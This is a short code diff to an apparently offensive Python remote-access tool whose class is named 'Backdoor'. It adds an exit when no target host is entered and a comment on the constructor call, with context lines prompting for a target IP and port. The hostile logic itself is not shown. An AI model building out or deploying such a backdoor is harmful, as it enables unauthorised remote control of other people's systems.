@@ -35,6 +35,9 @@ class Backdoor:
         try:
             self.host = str(input("\033[1;36mPut here the Target's IP:\033[0;0m "))  # Comment this for using direct connection
             self.port = int(input("\033[1;36mPut here the RPORT:\033[0;0m "))  # Comment this for using direct connection
+            if self.host == "":
+                print("\033[1;36mNo host Especified! Exiting...\033[0;0m")
+                sys.exit()
 
         except KeyboardInterrupt:
             print("\nExiting... Bye o/")
@@ -275,5 +278,5 @@ class Backdoor:
             #self.sock.close()
     def winreg(self,file, path):
         pass
-back = Backdoor()
+back = Backdoor() # Backdoor("ip",port)
 back.commands_initiating()
